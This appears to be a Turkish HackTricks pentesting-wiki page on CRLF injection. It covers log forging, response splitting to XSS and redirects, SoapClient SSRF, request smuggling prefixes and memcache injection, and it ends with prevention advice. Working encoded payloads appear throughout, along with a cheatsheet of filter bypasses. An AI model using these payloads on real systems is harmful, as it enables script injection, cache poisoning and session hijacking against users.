# CRLF (%0D%0A) Enjeksiyonu

{{#include ../banners/hacktricks-training.md}}



### CRLF

Taşıma İadesi (CR) ve Satır Beslemesi (LF), birlikte CRLF olarak bilinen, HTTP protokolünde bir satırın sonunu veya yenisinin başlangıcını belirtmek için kullanılan özel karakter dizileridir. Web sunucuları ve tarayıcılar, HTTP başlıkları ile bir yanıtın gövdesi arasında ayrım yapmak için CRLF kullanır. Bu karakterler, Apache ve Microsoft IIS gibi çeşitli web sunucu türleri arasında HTTP/1.1 iletişimlerinde evrensel olarak kullanılmaktadır.

### CRLF Enjeksiyon Açığı

CRLF enjeksiyonu, kullanıcı tarafından sağlanan girdiye CR ve LF karakterlerinin eklenmesini içerir. Bu eylem, sunucuyu, uygulamayı veya kullanıcıyı, enjekte edilen diziyi bir yanıtın sonu ve diğerinin başlangıcı olarak yorumlamaya yönlendirir. Bu karakterler doğası gereği zararlı olmasa da, yanlış kullanımları HTTP yanıt bölme ve diğer kötü niyetli faaliyetlere yol açabilir.

### Örnek: Bir Log Dosyasında CRLF Enjeksiyonu

[Example from here](https://www.invicti.com/blog/web-security/crlf-http-header/)

Bir yönetici panelindeki log dosyasını düşünün; formatı: `IP - Zaman - Ziyaret Edilen Yol`. Tipik bir giriş şöyle görünebilir:
```
123.123.123.123 - 08:15 - /index.php?page=home
```
Bir saldırgan, bu günlüğü manipüle etmek için bir CRLF enjeksiyonunu kullanabilir. HTTP isteğine CRLF karakterleri enjekte ederek, saldırgan çıktı akışını değiştirebilir ve günlük girişlerini sahteleyebilir. Örneğin, enjekte edilmiş bir dizi günlük girişini şu şekilde dönüştürebilir:
```
/index.php?page=home&%0d%0a127.0.0.1 - 08:15 - /index.php?page=home&restrictedaction=edit
```
Burada, `%0d` ve `%0a` CR ve LF'nin URL kodlu formlarını temsil eder. Saldırıdan sonra, günlük yanıltıcı bir şekilde şunu gösterecektir:
```
IP - Time - Visited Path

123.123.123.123 - 08:15 - /index.php?page=home&
127.0.0.1 - 08:15 - /index.php?page=home&restrictedaction=edit
```
Saldırgan, localhost'un (sunucu ortamında genellikle güvenilen bir varlık) eylemleri gerçekleştirmiş gibi görünmesini sağlayarak kötü niyetli faaliyetlerini gizler. Sunucu, `%0d%0a` ile başlayan sorgu kısmını tek bir parametre olarak yorumlarken, `restrictedaction` parametresi ayrı bir girdi olarak ayrıştırılır. Manipüle edilmiş sorgu, meşru bir yönetim komutunu etkili bir şekilde taklit eder: `/index.php?page=home&restrictedaction=edit`

### HTTP Yanıt Bölme

#### Açıklama

HTTP Yanıt Bölme, bir saldırganın HTTP yanıtlarının yapısını istismar etmesi durumunda ortaya çıkan bir güvenlik açığıdır. Bu yapı, başlıkları gövde kısmından ayıran belirli bir karakter dizisi kullanır; bu dizinin adı, Carriage Return (CR) ve ardından Line Feed (LF) olarak adlandırılır ve birlikte CRLF olarak anılır. Bir saldırgan, bir yanıt başlığına bir CRLF dizisi eklemeyi başarırsa, sonraki yanıt içeriğini etkili bir şekilde manipüle edebilir. Bu tür bir manipülasyon, özellikle Cross-site Scripting (XSS) gibi ciddi güvenlik sorunlarına yol açabilir.

#### HTTP Yanıt Bölme ile XSS

1. Uygulama, şu şekilde özel bir başlık ayarlar: `X-Custom-Header: UserInput`
2. Uygulama, `UserInput` için değeri bir sorgu parametresinden alır, örneğin "user_input". Uygun girdi doğrulaması ve kodlaması olmayan senaryolarda, bir saldırgan CRLF dizisini ve ardından kötü niyetli içeriği içeren bir yük oluşturabilir.
3. Bir saldırgan, özel olarak hazırlanmış bir 'user_input' ile bir URL oluşturur: `?user_input=Value%0d%0a%0d%0a<script>alert('XSS')</script>`
- Bu URL'de, `%0d%0a%0d%0a` CRLFCRLF'nin URL kodlu biçimidir. Sunucuyu bir CRLF dizisi eklemeye kandırır, böylece sunucu sonraki kısmı yanıt gövdesi olarak kabul eder.
4. Sunucu, saldırganın girdisini yanıt başlığında yansıtır ve kötü niyetli script'in tarayıcı tarafından yanıt gövdesinin bir parçası olarak yorumlandığı istenmeyen bir yanıt yapısına yol açar.

#### Yönlendirmeye Yol Açan HTTP Yanıt Bölme Örneği

From [https://medium.com/bugbountywriteup/bugbounty-exploiting-crlf-injection-can-lands-into-a-nice-bounty-159525a9cb62](https://medium.com/bugbountywriteup/bugbounty-exploiting-crlf-injection-can-lands-into-a-nice-bounty-159525a9cb62)

Tarayıcıya:
```
/%0d%0aLocation:%20http://myweb.com
```
Ve sunucu şu başlıkla yanıt verir:
```
Location: http://myweb.com
```
**Diğer örnek: (şuradan** [**https://www.acunetix.com/websitesecurity/crlf-injection/**](https://www.acunetix.com/websitesecurity/crlf-injection/)**)**
```
http://www.example.com/somepage.php?page=%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0aContent-Length:%2025%0d%0a%0d%0a%3Cscript%3Ealert(1)%3C/script%3E
```
#### URL Yolunda

Yükü **URL yolunun içinde** göndererek sunucudan **yanıtı** kontrol edebilirsiniz (örnek [buradan](https://hackerone.com/reports/192667)):
```
http://stagecafrstore.starbucks.com/%3f%0d%0aLocation:%0d%0aContent-Type:text/html%0d%0aX-XSS-Protection%3a0%0d%0a%0d%0a%3Cscript%3Ealert%28document.domain%29%3C/script%3E
http://stagecafrstore.starbucks.com/%3f%0D%0ALocation://x:1%0D%0AContent-Type:text/html%0D%0AX-XSS-Protection%3a0%0D%0A%0D%0A%3Cscript%3Ealert(document.domain)%3C/script%3E
```
Daha fazla örnek için kontrol edin:

{% embed url="https://github.com/EdOverflow/bugbounty-cheatsheet/blob/master/cheatsheets/crlf.md" %}

### HTTP Header Injection

HTTP Header Injection, genellikle CRLF (Carriage Return and Line Feed) enjeksiyonu aracılığıyla istismar edilen, saldırganların HTTP başlıkları eklemesine olanak tanır. Bu, XSS (Cross-Site Scripting) filtreleri veya SOP (Same-Origin Policy) gibi güvenlik mekanizmalarını zayıflatabilir ve potansiyel olarak CSRF tokenları gibi hassas verilere yetkisiz erişim veya çerez yerleştirme yoluyla kullanıcı oturumlarının manipülasyonu ile sonuçlanabilir.

#### HTTP Header Injection ile CORS'u İstismar Etme

Bir saldırgan, SOP tarafından dayatılan kısıtlamaları aşarak CORS (Cross-Origin Resource Sharing) etkinleştirmek için HTTP başlıkları enjekte edebilir. Bu ihlal, kötü niyetli kaynaklardan gelen betiklerin farklı bir kaynaktan gelen kaynaklarla etkileşimde bulunmasına olanak tanır ve potansiyel olarak korunan verilere erişim sağlar.

#### CRLF Aracılığıyla SSRF ve HTTP Request Injection

CRLF enjeksiyonu, tamamen yeni bir HTTP isteği oluşturmak ve enjekte etmek için kullanılabilir. Bunun dikkat çekici bir örneği, PHP'nin `SoapClient` sınıfındaki, özellikle `user_agent` parametresindeki zayıflıktır. Bu parametreyi manipüle ederek, bir saldırgan ek başlıklar ve gövde içeriği ekleyebilir veya hatta tamamen yeni bir HTTP isteği enjekte edebilir. Aşağıda bu istismarı gösteren bir PHP örneği bulunmaktadır:
```php
$target = 'http://127.0.0.1:9090/test';
$post_string = 'variable=post value';
$crlf = array(
'POST /proxy HTTP/1.1',
'Host: local.host.htb',
'Cookie: PHPSESSID=[PHPSESSID]',
'Content-Type: application/x-www-form-urlencoded',
'Content-Length: '.(string)strlen($post_string),
"\r\n",
$post_string
);

$client = new SoapClient(null,
array(
'uri'=>$target,
'location'=>$target,
'user_agent'=>"IGN\r\n\r\n".join("\r\n",$crlf)
)
);

# Put a netcat listener on port 9090
$client->__soapCall("test", []);
```
### Header Injection to Request Smuggling

Bu teknik ve potansiyel sorunlar hakkında daha fazla bilgi için [**orijinal kaynağı kontrol edin**](https://portswigger.net/research/making-http-header-injection-critical-via-response-queue-poisoning).

İlk isteğe yanıt verdikten sonra **arka uç bağlantıyı açık tutmasını sağlamak** için gerekli başlıkları enjekte edebilirsiniz:
```
GET /%20HTTP/1.1%0d%0aHost:%20redacted.net%0d%0aConnection:%20keep-alive%0d%0a%0d%0a HTTP/1.1
```
Sonrasında, ikinci bir isteğin belirtilmesi mümkündür. Bu senaryo genellikle [HTTP request smuggling](http-request-smuggling/) ile ilgilidir; burada, sunucu tarafından eklenen ekstra başlıklar veya gövde öğeleri, çeşitli güvenlik istismarlarına yol açabilir.

**İstismar:**

1. **Kötü Amaçlı Ön Ek Enjeksiyonu**: Bu yöntem, bir sonraki kullanıcının isteğini veya bir web önbelleğini zehirlemek için kötü amaçlı bir ön ek belirlemeyi içerir. Bunun bir örneği:

`GET /%20HTTP/1.1%0d%0aHost:%20redacted.net%0d%0aConnection:%20keep-alive%0d%0a%0d%0aGET%20/redirplz%20HTTP/1.1%0d%0aHost:%20oastify.com%0d%0a%0d%0aContent-Length:%2050%0d%0a%0d%0a HTTP/1.1`

2. **Yanıt Kuyruğu Zehirleme için Bir Ön Ek Oluşturma**: Bu yaklaşım, ardışık gereksiz verilerle birleştirildiğinde tam bir ikinci isteği oluşturan bir ön ek yaratmayı içerir. Bu, yanıt kuyruğu zehirlenmesini tetikleyebilir. Bir örnek:

`GET /%20HTTP/1.1%0d%0aHost:%20redacted.net%0d%0aConnection:%20keep-alive%0d%0a%0d%0aGET%20/%20HTTP/1.1%0d%0aFoo:%20bar HTTP/1.1`

### Memcache Enjeksiyonu

Memcache, **açık metin protokolü kullanan bir anahtar-değer deposudur**. Daha fazla bilgi için:

{{#ref}}
../network-services-pentesting/11211-memcache/
{{#endref}}

**Tam bilgi için**[ **orijinal yazıyı**](https://www.sonarsource.com/blog/zimbra-mail-stealing-clear-text-credentials-via-memcache-injection/) **okuyun**

Bir platform, **bir HTTP isteğinden veri alıyorsa ve bunu temizlemeden** **memcache** sunucusuna **istekler** yapmak için kullanıyorsa, bir saldırgan bu davranışı **yeni memcache komutları enjekte etmek için** kötüye kullanabilir.

Örneğin, keşfedilen orijinal zafiyette, önbellek anahtarları, bir kullanıcının bağlanması gereken IP ve portu döndürmek için kullanıldı ve saldırganlar, **önbelleği zehirleyecek memcache komutları enjekte edebildiler**; bu da **kurbanların bilgilerini** (kullanıcı adları ve şifreler dahil) saldırgan sunuculara göndermelerine neden oldu:

<figure><img src="../images/image (659).png" alt="https://assets-eu-01.kc-usercontent.com/d0f02280-9dfb-0116-f970-137d713003b6/ba72cd16-2ca0-447b-aa70-5cde302a0b88/body-578d9f9f-1977-4e34-841c-ad870492328f_10.png?w=1322&#x26;h=178&#x26;auto=format&#x26;fit=crop"><figcaption></figcaption></figure>

Ayrıca, araştırmacılar, saldırganın bilmediği kullanıcıların e-posta adreslerine saldırganın IP ve portlarını göndermek için memcache yanıtlarını senkronize edemeyeceklerini de keşfettiler:

<figure><img src="../images/image (637).png" alt="https://assets-eu-01.kc-usercontent.com/d0f02280-9dfb-0116-f970-137d713003b6/c6c1f3c4-d244-4bd9-93f7-2c88f139acfa/body-3f9ceeb9-3d6b-4867-a23f-e0e50a46a2e9_14.png?w=1322&#x26;h=506&#x26;auto=format&#x26;fit=crop"><figcaption></figcaption></figure>

### Web Uygulamalarında CRLF / HTTP Başlık Enjeksiyonlarını Önleme

Web uygulamalarında CRLF (Carriage Return and Line Feed) veya HTTP Başlık Enjeksiyonlarının risklerini azaltmak için aşağıdaki stratejiler önerilmektedir:

1. **Yanıt Başlıklarında Doğrudan Kullanıcı Girdisinden Kaçının:** En güvenli yaklaşım, kullanıcı tarafından sağlanan girdileri doğrudan yanıt başlıklarına dahil etmemektir.
2. **Özel Karakterleri Kodlayın:** Doğrudan kullanıcı girdisinden kaçınmak mümkün değilse, CR (Carriage Return) ve LF (Line Feed) gibi özel karakterleri kodlamak için özel bir işlev kullanıldığından emin olun. Bu uygulama, CRLF enjeksiyonu olasılığını önler.
3. **Programlama Dilini Güncelleyin:** Web uygulamalarınızda kullanılan programlama dilini düzenli olarak en son sürüme güncelleyin. HTTP başlıklarını ayarlamakla görevli işlevler içinde CR ve LF karakterlerinin enjekte edilmesine doğal olarak izin vermeyen bir sürümü tercih edin.

### CHEATSHEET

[Cheatsheet from here](https://twitter.com/NinadMishra5/status/1650080604174667777)
```
1. HTTP Response Splitting
• /%0D%0ASet-Cookie:mycookie=myvalue (Check if the response is setting this cookie)

2. CRLF chained with Open Redirect
• //www.google.com/%2F%2E%2E%0D%0AHeader-Test:test2
• /www.google.com/%2E%2E%2F%0D%0AHeader-Test:test2
• /google.com/%2F..%0D%0AHeader-Test:test2
• /%0d%0aLocation:%20http://example.com

3. CRLF Injection to XSS
• /%0d%0aContent-Length:35%0d%0aX-XSS-Protection:0%0d%0a%0d%0a23
• /%3f%0d%0aLocation:%0d%0aContent-Type:text/html%0d%0aX-XSS-Protection%3a0%0d%0a%0d%0a%3Cscript%3Ealert%28document.domain%29%3C/script%3E

4. Filter Bypass
• %E5%98%8A = %0A = \u560a
• %E5%98%8D = %0D = \u560d
• %E5%98%BE = %3E = \u563e (>)
• %E5%98%BC = %3C = \u563c (<)
• Payload = %E5%98%8A%E5%98%8DSet-Cookie:%20test
```
## Otomatik Araçlar

- [https://github.com/Raghavd3v/CRLFsuite](https://github.com/Raghavd3v/CRLFsuite)
- [https://github.com/dwisiswant0/crlfuzz](https://github.com/dwisiswant0/crlfuzz)

## Kaba Güç Tespit Listesi

- [https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/crlf.txt](https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/crlf.txt)

## Referanslar

- [**https://www.invicti.com/blog/web-security/crlf-http-header/**](https://www.invicti.com/blog/web-security/crlf-http-header/)
- [**https://www.acunetix.com/websitesecurity/crlf-injection/**](https://www.acunetix.com/websitesecurity/crlf-injection/)
- [**https://portswigger.net/research/making-http-header-injection-critical-via-response-queue-poisoning**](https://portswigger.net/research/making-http-header-injection-critical-via-response-queue-poisoning)
- [**https://www.netsparker.com/blog/web-security/crlf-http-header/**](https://www.netsparker.com/blog/web-security/crlf-http-header/)



{{#include ../banners/hacktricks-training.md}}
